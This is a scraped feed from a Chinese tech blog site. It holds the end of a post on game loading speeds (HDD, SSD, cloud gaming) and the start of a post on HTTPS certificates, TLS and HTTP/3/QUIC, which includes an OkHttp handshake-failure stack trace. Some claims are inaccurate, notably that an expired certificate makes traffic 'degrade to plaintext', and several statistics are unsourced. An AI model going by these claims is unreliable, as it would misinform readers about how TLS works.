<table><thead><tr><th>对比项</th><th>机械硬盘 (HDD)</th><th>SATA SSD</th><th>NVMe SSD</th><th>云游戏</th></tr></thead><tbody><tr><td><strong>读取速度</strong></td><td>100-150 MB/s</td><td>500-600 MB/s</td><td>3000-7000 MB/s</td><td>取决于网络</td></tr><tr><td><strong>游戏加载时间</strong></td><td>60秒+</td><td>15-20秒</td><td>5-10秒</td><td>5-15秒</td></tr><tr><td><strong>随机读取性能</strong></td><td>差</td><td>好</td><td>极好</td><td>取决于网络</td></tr><tr><td><strong>价格/GB</strong></td><td>便宜（约0.03）</td><td>中等（约0.08）</td><td>较贵（约0.1）</td><td>订阅制</td></tr><tr><td><strong>游戏体验</strong></td><td>😴 等待焦虑</td><td>😊 基本满意</td><td>🚀 丝滑流畅</td><td>🎮 依赖网络</td></tr><tr><td><strong>适合游戏类型</strong></td><td>单机大作</td><td>大多数游戏</td><td>3A大作、开放世界</td><td>随时随地玩</td></tr><tr><td><strong>功耗</strong></td><td>高</td><td>低</td><td>低</td><td>服务器端</td></tr><tr><td><strong>噪音</strong></td><td>有（硬盘转动）</td><td>无</td><td>无</td><td>无</td></tr><tr><td><strong>可靠性</strong></td><td>一般（机械结构）</td><td>好（无机械部件）</td><td>很好</td><td>取决于服务商</td></tr></tbody></table>
<h3 data-id="heading-17">📈 数据支撑：游戏加载的"硬核数据"</h3>
<ul>
<li>⚡ <strong>SSD可将游戏加载时间从60秒减少到10秒以内</strong>，速度提升5-6倍</li>
<li>🎮 现代3A游戏平均容量超过<strong>100GB</strong>，是10年前的10倍</li>
<li>⏱️ 玩家平均每天花在游戏加载上的时间<strong>超过30分钟</strong></li>
<li>🚀 NVMe SSD的随机读取速度是HDD的<strong>100倍以上</strong></li>
<li>💾 游戏资源中，<strong>贴图占60-70%</strong>，是最大的加载瓶颈</li>
<li>🎬 4K游戏加载需要读取的纹理数据是1080p游戏的<strong>4倍以上</strong></li>
<li>📶 云游戏最低需要<strong>25Mbps</strong>的网络带宽才能流畅运行</li>
</ul>
<h3 data-id="heading-18">🏢 游戏加载技术的应用场景</h3>








































<table><thead><tr><th>应用场景</th><th>技术</th><th>效果</th></tr></thead><tbody><tr><td>🎮 3A大作</td><td>NVMe SSD + 异步加载</td><td>加载时间&lt;10秒</td></tr><tr><td>🗺️ 开放世界</td><td>预加载 + 纹理流送</td><td>无缝切换场景</td></tr><tr><td>🎮 手游</td><td>LZ4压缩 + AssetBundle</td><td>快速启动</td></tr><tr><td>🖥️ PC游戏</td><td>SSD + 游戏补丁</td><td>快速更新</td></tr><tr><td>🎬 游戏过场</td><td>后台预加载</td><td>无感加载</td></tr><tr><td>🌐 云游戏</td><td>边缘计算 + CDN</td><td>即点即玩</td></tr></tbody></table>
<h3 data-id="heading-19">⚠️ 常见误区纠正</h3>
<h4 data-id="heading-20">1. "SSD只是加载快，游戏中差不多？"</h4>
<p><strong>错！</strong> SSD不仅影响加载时间，还会影响：</p>
<ul>
<li>场景切换速度</li>
<li>贴图流送质量</li>
<li>游戏存档速度</li>
<li>地图快速旅行时间</li>
</ul>
<h4 data-id="heading-21">2. "游戏加载越快越好？"</h4>
<p><strong>不一定！</strong> 加载速度受多种因素影响：</p>
<ul>
<li>CPU解压速度</li>
<li>GPU上传速度</li>
<li>资源依赖关系</li>
<li>网络带宽（云游戏）</li>
</ul>
<h4 data-id="heading-22">3. "压缩资源不会影响画质？"</h4>
<p><strong>不一定！</strong> 有损压缩会影响画质：</p>
<ul>
<li>贴图压缩会有一定失真</li>
<li>音频压缩会影响音质</li>
<li>需要权衡文件大小和画质</li>
</ul>
<h4 data-id="heading-23">4. "云游戏不需要加载？"</h4>
<p><strong>错！</strong> 云游戏需要加载：</p>
<ul>
<li>游戏启动时的初始化</li>
<li>网络波动时的缓冲</li>
<li>高画质视频流的传输</li>
</ul>
<h4 data-id="heading-24">5. "机械硬盘已经过时了？"</h4>
<p><strong>不完全对！</strong> HDD仍有优势：</p>
<ul>
<li>价格便宜，适合存储大量游戏</li>
<li>适合对加载速度要求不高的游戏</li>
<li>大容量存储（比如游戏库备份）</li>
</ul>
<h3 data-id="heading-25">🔮 未来展望：游戏加载技术的发展趋势</h3>
<h4 data-id="heading-26">1. 🚀 更快存储设备</h4>
<p><strong>PCIe 5.0/6.0 SSD</strong></p>
<ul>
<li>PCIe 5.0 SSD读取速度可达<strong>14GB/s</strong></li>
<li>PCIe 6.0 SSD读取速度可达<strong>30GB/s</strong></li>
<li>游戏加载时间将缩短到<strong>1-2秒</strong></li>
</ul>
<p><strong>存储级内存（SCM）</strong></p>
<ul>
<li>类似DRAM的速度，SSD的持久性</li>
<li>可能取代传统SSD</li>
<li>游戏几乎可以"即时启动"</li>
</ul>
<h4 data-id="heading-27">2. 🧠 AI驱动的资源管理</h4>
<p><strong>智能预加载</strong></p>
<ul>
<li>AI预测玩家行为</li>
<li>提前加载可能需要的资源</li>
<li>玩家几乎感觉不到加载</li>
</ul>
<p><strong>自适应资源流送</strong></p>
<ul>
<li>根据玩家视角动态加载资源</li>
<li>保证重要区域优先加载</li>
<li>优化内存使用</li>
</ul>
<h4 data-id="heading-28">3. ☁️ 云游戏进化</h4>
<p><strong>5G/6G网络</strong></p>
<ul>
<li>5G延迟可低至1ms</li>
<li>6G延迟可低至0.1ms</li>
<li>云游戏体验接近本地运行</li>
</ul>
<p><strong>边缘计算</strong></p>
<ul>
<li>游戏服务器更靠近玩家</li>
<li>减少网络延迟</li>
<li>提高加载速度</li>
</ul>
<h4 data-id="heading-29">4. 🎮 新一代游戏技术</h4>
<p><strong>DirectStorage（DirectX 12 Ultimate）</strong></p>
<ul>
<li>允许GPU直接访问SSD</li>
<li>绕过CPU，直接加载纹理到显存</li>
<li>大幅减少加载时间</li>
</ul>
<p><strong>GPU资源压缩</strong></p>
<ul>
<li>更好的纹理压缩算法</li>
<li>更快的解压硬件</li>
<li>减少显存占用和带宽需求</li>
</ul>
<p><strong>游戏引擎优化</strong></p>
<ul>
<li>更高效的资源管理系统</li>
<li>更智能的加载调度</li>
<li>更快的初始化流程</li>
</ul>
<h3 data-id="heading-30">🎓 互动小测验：你答对了吗？</h3>


















































<table><thead><tr><th>问题</th><th>答案</th><th>你答对了吗？</th></tr></thead><tbody><tr><td>现代3A游戏的平均容量是多少？</td><td>100GB以上</td><td>✅/❌</td></tr><tr><td>SSD相比HDD能提升多少加载速度？</td><td>5-35倍</td><td>✅/❌</td></tr><tr><td>游戏资源中占比最大的是什么？</td><td>贴图（60-70%）</td><td>✅/❌</td></tr><tr><td>预加载技术的目的是什么？</td><td>提前加载可能需要的资源</td><td>✅/❌</td></tr><tr><td>PCIe 5.0 SSD的读取速度可达多少？</td><td>14GB/s</td><td>✅/❌</td></tr><tr><td>云游戏最低需要多少网络带宽？</td><td>25Mbps</td><td>✅/❌</td></tr><tr><td>DirectStorage技术有什么作用？</td><td>允许GPU直接访问SSD</td><td>✅/❌</td></tr><tr><td>游戏加载的"四大件"包括什么？</td><td>引擎、贴图、音频、数据</td><td>✅/❌</td></tr></tbody></table>
<h3 data-id="heading-31">🎯 结语：加载时间的"进化论"</h3>
<p>从卡带的"即点即玩"，到光盘的"漫长等待"，再到SSD的"飞速加载"——游戏加载技术的进化，正是整个游戏行业进步的缩影！</p>
<p><strong>记住</strong>：</p>
<ul>
<li>💾 存储速度是加载时间的"天花板"</li>
<li>🧠 智能预加载可以"欺骗"玩家感知</li>
<li>☁️ 云游戏可能是未来的"终极方案"</li>
</ul>
<p>下次当你等待游戏加载时，不妨想想背后的技术——正是这些"看不见的优化"，让我们的游戏体验变得越来越好！</p>
<h3 data-id="heading-32">💬 互动话题</h3>
<ol>
<li>你用过HDD、SSD还是云游戏？体验如何？</li>
<li>你遇到过最长的游戏加载时间是多久？</li>
<li>你希望未来的游戏加载技术是什么样的？</li>
<li>如果你设计游戏，会用什么技术来优化加载体验？</li>
</ol>
<p>快来评论区聊聊你的想法！💬 点赞收藏不迷路，咱们下期继续探索计算机的"十万个为什么"！🎉</p>
<p><strong>关注我</strong>，下期带你解锁更多计算机的"奇葩冷知识"！🤓</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析]]></title>    <link>https://juejin.cn/post/7591806035759317034</link>    <guid>https://juejin.cn/post/7591806035759317034</guid>    <pubDate>2026-01-06T08:42:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591806035759317034" data-draft-id="7591788451030302763" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T08:42:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="自然吸气发动机"/> <meta itemprop="url" content="https://juejin.cn/user/3892706247712647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            英雄联盟证书过期上热搜？吃透 HTTPS 核心：证书、TLS、HTTP3/QUIC 故障复盘全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3892706247712647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    自然吸气发动机
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:42:45.000Z" title="Tue Jan 06 2026 08:42:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">前言</h2>
<p>近期笔者亲历两起因 HTTPS 配置不当引发的生产级 P0 故障，另一起更是登上热搜的英雄联盟 SSL 证书过期事件。这些看似 “低级” 的配置问题，却造成了大面积服务不可用，背后折射出的 HTTPS 核心技术盲点值得所有技术人警醒。本文将结合这两起典型故障，拆解 HTTPS 协议、证书、TLS 加密等核心知识点，帮大家理清容易踩坑的关键环节。</p>
<h4 data-id="heading-1">故障 1：英雄联盟 SSL 证书过期致全网玩家无法登录</h4>
<p>作为全球顶级网游，英雄联盟因 SSL 证书未及时续期，导致大量玩家无法正常登录游戏，故障持续超 10 小时。这一 “低级失误” 引发全网调侃的同时，也让我们意识到：哪怕是头部产品，忽视 HTTPS 证书基础管理也会酿成重大事故。</p>
<h4 data-id="heading-2">故障 2：服务端升级 TLS 协议导致客户端请求全量失败</h4>
<p>笔者对接的某客户为提升网站安全等级，将服务器加密协议仅保留 TLS 1.3，直接导致我方基于 OkHttp 的客户端请求全部报错，核心异常堆栈如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-number">2026</span>-<span class="hljs-number">01</span>-<span class="hljs-number">06</span> <span class="hljs-number">01</span>:<span class="hljs-number">19</span>:<span class="hljs-number">01.204</span> SGMWH5-qDyCNpxbPkHiMVxV9mA7218NDaw0hI1I [com.xxxx.HttpClientUtils] [ERROR] [<span class="hljs-number">3355283</span>]        请求失败
javax.net.ssl.SSLHandshakeException: Received fatal alert: protocol_version
        at sun.security.ssl.Alert.createSSLException(Alert.java:<span class="hljs-number">131</span>)
        at sun.security.ssl.Alert.createSSLException(Alert.java:<span class="hljs-number">117</span>)
        at sun.security.ssl.TransportContext.fatal(TransportContext.java:<span class="hljs-number">357</span>)
        at sun.security.ssl.Alert$AlertConsumer.consume(Alert.java:<span class="hljs-number">293</span>)
        at sun.security.ssl.TransportContext.dispatch(TransportContext.java:<span class="hljs-number">203</span>)
        at sun.security.ssl.SSLTransport.decode(SSLTransport.java:<span class="hljs-number">154</span>)
        at sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:<span class="hljs-number">1290</span>)
        at sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:<span class="hljs-number">1199</span>)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:<span class="hljs-number">401</span>)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:<span class="hljs-number">373</span>)
        at okhttp3.internal.connection.RealConnection.connectTls(RealConnection.java:<span class="hljs-number">320</span>)
        at okhttp3.internal.connection.RealConnection.establishProtocol(RealConnection.java:<span class="hljs-number">284</span>)
        at okhttp3.internal.connection.RealConnection.connect(RealConnection.java:<span class="hljs-number">169</span>)
        at okhttp3.internal.connection.StreamAllocation.findConnection(StreamAllocation.java:<span class="hljs-number">257</span>)
        at okhttp3.internal.connection.StreamAllocation.findHealthyConnection(StreamAllocation.java:<span class="hljs-number">135</span>)
        at okhttp3.internal.connection.StreamAllocation.newStream(StreamAllocation.java:<span class="hljs-number">114</span>)
        at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:<span class="hljs-number">42</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:<span class="hljs-number">94</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:<span class="hljs-number">93</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:<span class="hljs-number">125</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">147</span>)
        at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:<span class="hljs-number">121</span>)
        at okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:<span class="hljs-number">264</span>)
        at okhttp3.RealCall.execute(RealCall.java:<span class="hljs-number">93</span>)
...
</code></pre>
<p>异常根源清晰指向 “协议版本不兼容”：服务端仅开启 TLS 1.3，而我方 OkHttp 客户端默认使用 TLS 1.2 发起请求，最终导致全量请求失败。</p>
<p>故障虽已解决，但背后的技术原理值得深究。不妨先自测以下核心问题的掌握程度：</p>
<blockquote>
<ol>
<li>HTTPS 与 HTTP 的核心区别？HTTP2.0、HTTP3.0 的差异？QUIC 协议是什么？</li>
<li>HTTPS 证书的核心作用？浏览器如何检测证书过期？</li>
<li>TLS 协议的定义？与 SSL 协议的关系？</li>
<li>如何查看网站的安全等级和证书信息？</li>
<li>OkHttp 客户端默认 SSL 配置？不同 JDK 版本下 OkHttp 的 SSL 配置是否有差异？</li>
</ol>
</blockquote>
<p>接下来，我们逐一拆解这些关键问题。</p>
<h3 data-id="heading-3">为什么 HTTPS 必须要有证书？</h3>
<p>提到 HTTPS 与 HTTP 的区别，多数人能说出 “端口不同（80 vs 443）”“HTTPS 加密传输”，但很少有人深究：为何单纯的加密不足以保障安全，必须依赖证书？</p>
<p>如果仅靠 “请求 / 响应加密” 就能解决问题，那么在 HTTP 层面手动加密数据也能实现。但互联网的核心风险并非 “数据窃听”，而是 “身份篡改”—— 没有证书，你无法确认访问的网站是否为钓鱼网站；更关键的是，客户端与服务端无法完成安全的密钥协商，最终加密连接也无法建立。</p>
<p>简单来说，HTTPS 证书的核心价值有两点：</p>
<ul>
<li>身份验证：证明网站的合法身份，防止钓鱼攻击；</li>
<li>密钥协商：为客户端与服务端建立加密连接提供安全的密钥交换机制。</li>
</ul>
<h3 data-id="heading-4">HTTPS 证书的获取与使用</h3>
<h4 data-id="heading-5">证书的类型</h4>
<p>目前主流云厂商（阿里云、腾讯云等）均可申请 HTTPS 证书，按验证等级可分为三类：</p>
<ul>
<li>DV（域名验证型）：免费且常用，仅验证域名归属，适合个人 / 小型网站；</li>
<li>OV（组织验证型）：需验证企业真实身份，适合中小企业；</li>
<li>EV（扩展验证型）：验证最严格，浏览器地址栏会显示企业名称，适合银行、支付平台等敏感场景。</li>
</ul>
<h4 data-id="heading-6">证书的有效期</h4>
<ul>
<li>免费证书（如 DV 型）：有效期通常 90 天，支持自动续签；</li>
<li>付费证书（OV/EV 型）：有效期 1-2 年，需手动续签 / 重新申请。</li>
</ul>
<h4 data-id="heading-7">证书过期的影响</h4>
<p>有人会问：证书过期后网站仍能访问，仅浏览器提示 “不安全”，为何必须续期？核心原因有三：</p>
<ol>
<li>密钥协商失败：浏览器 / 客户端与服务器无法协商出安全的加密密钥，传输会退化为明文，数据直接 “裸奔”；</li>
<li>用户信任丧失：浏览器的 “不安全” 提示会导致用户放弃访问；</li>
<li>客户端请求报错：通过 OkHttp 等工具访问过期证书的网站时，会直接抛出<code>SSLHandshakeException</code>异常（这也是英雄联盟证书过期导致玩家无法登录的核心原因）。</li>
</ol>
<p>证书申请后，需将<code>.pem</code>、<code>.key</code>等格式的证书文件配置到 Nginx、Apache、Tomcat 等 Web 服务器，并开启 TLS 协议支持，才能真正生效。</p>
<h3 data-id="heading-8">浏览器如何验证证书合法性？</h3>
<p>浏览器并不会内置所有网站的证书，而是通过 “信任链” 机制验证，流程类似 “身份证核验”：</p>
<blockquote>
<ol>
<li>网站向浏览器发送自身证书；</li>
<li>验证签发机构：检查证书的签发 CA（证书颁发机构）是否在浏览器的信任名单中，排除 “假证书”；</li>
<li>验证证书有效性：确认证书绑定的域名与访问域名一致（防钓鱼）、证书在有效期内（未过期 / 未吊销）；</li>
<li>验证签名完整性：CA 用私钥给证书 “签名”，浏览器用内置的 CA 根证书（公钥）验证签名，确保证书未被篡改。</li>
</ol>
</blockquote>
<p><strong>实操技巧</strong>：点击浏览器地址栏的🔒图标，即可查看当前网站的证书信息（如有效期、签发机构、加密协议等），如下图所示</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0982f3328784e2a834e007077d33469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Ieq54S25ZC45rCU5Y-R5Yqo5py6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768293765&amp;x-signature=S8yxqhk%2Fy8Nj2IfhG6UeFW5DwRI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">Http2.0  Http3.0 与 QUIC 协议</h3>
<p>HTTP2.0 和 HTTP3.0 的诞生，均是为了解决 HTTP/1.1 的性能瓶颈，但二者的底层传输协议截然不同 ——HTTP2.0 基于 TCP，HTTP3.0 基于 QUIC。</p>
<p>先明确协议层级：HTTP 属于 OSI 应用层协议，TCP/UDP 属于传输层协议；而 QUIC 协议的层级尚无统一定论，笔者更倾向于归为应用层（因其底层依赖 UDP，且封装了 TCP 的可靠性 + TLS 的加密能力）。</p>
<h4 data-id="heading-10">HTTP3.0 使用 QUIC 协议的核心优势</h4>
<ol>
<li>握手效率提升：合并 TCP 三次握手与 TLS 握手流程，大幅缩短连接建立时间；</li>
<li>解决队头阻塞：将数据分割为多个独立流，每个流独立传输，彻底解决 TCP 的队头阻塞问题。</li>
</ol>
<p>这里补充说明下什么叫做 “TCP队头阻塞问题”</p>
<blockquote>
<p>TCP 是 “面向连接的可靠传输协议”，核心特性是 “按序交付”—— 数据被分割为多个数据包后，服务端必须按发送顺序接收重组。若某个数据包丢失 / 延迟，后续已到达的数据包会被缓存，等待丢失数据包重传完成后再处理，这就是 “队头阻塞”。
在 HTTP2.0 的多路复用场景中，多个请求复用同一个 TCP 连接，只要其中一个帧对应的数据包丢失，整个连接上的所有请求都会被阻塞，直接削弱多路复用的性能优势。</p>
</blockquote>
<h4 data-id="heading-11">为何 HTTP3.0 尚未全面普及？</h4>
<p>尽管 HTTP3.0 性能更优，但国内多数网站仍使用 HTTP2.0（如稀土掘金），核心原因之一是 TLS 协议的兼容性：</p>
<ul>
<li>HTTP3.0 基于 QUIC 协议，而 QUIC 原生要求 TLS 1.3；</li>
<li>部分老旧客户端（如低版本 JDK+OkHttp）不支持 TLS 1.3，强制升级会导致请求失败。</li>
</ul>
<p><strong>实操技巧</strong>：在 Chrome 控制台执行<code>window.chrome.loadTimes()</code>，查看<code>npnNegotiatedProtocol</code>属性就知道当前网站在使用的是HTTP3还是HTTP2：</p>
<ul>
<li><code>h2</code>：使用 HTTP2.0；</li>
<li><code>h3</code>：使用 HTTP3.0。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7c29e3f7b0143a991423c9e92e649e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Ieq54S25ZC45rCU5Y-R5Yqo5py6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768293765&amp;x-signature=TMPBvmSw2IPJZBwBPEMqrPDTssA%3D" alt="image copy.png" loading="lazy"/></p>
<h3 data-id="heading-12">TLS是什么 和 SSL 协议是什么关系</h3>
<p>早期教程常将 HTTPS 简化为 “HTTP+SSL”，但这一表述现已过时：</p>
<ul>
<li>SSL：由网景公司 1994 年推出，历经 SSL 1.0/2.0/3.0 版本，因存在致命漏洞（如 POODLE 漏洞），2015 年起被主流浏览器 / 服务器全面禁用；</li>
<li>TLS：作为 SSL 的替代协议，继承了 SSL 的核心目标，且持续迭代优化（主流版本为 TLS 1.2、TLS 1.3）。</li>
</ul>
<p>尽管历史原因导致 “SSL 证书” 的说法仍被沿用，但如今 HTTPS 的核心加密协议已是 TLS。</p>
<h4 data-id="heading-13">TLS 的核心价值</h4>
<p>与 SSL 一致，TLS 主要解决三大问题：</p>
<ul>
<li>数据加密：避免传输过程中被窃听；</li>
<li>身份验证：配合证书确认通信双方身份；</li>
<li>数据完整性：防止数据被篡改。</li>
</ul>
<p>在Https现在主流使用的是 TLS 1.3 和 TLS 1.2 两种加密协议，但是由于历史原因很多人仍会说 “SSL 证书”，但是实际上SSL已经不再是HTTPS的主流加密协议了</p>
<p>TLS的核心价值和SSL需要解决的问题是一致的，主要有三点： 数据加密（避免传输过程中被窃听）、 身份验证（配合证书确认通信双方身份）、数据完整性（防止数据被篡改）</p>
<h4 data-id="heading-14">TLS 1.2 vs TLS 1.3</h4>
<p>TLS 1.3 相比 1.2 做了关键优化：</p>
<ul>
<li>简化握手流程：将 “两次往返” 缩短为 “一次往返”，提升 HTTPS 连接建立速度；</li>
<li>移除不安全加密套件：进一步提升安全性。</li>
</ul>
<p>除此之外TLS和Http的版本也有常用的搭配关系：</p>

























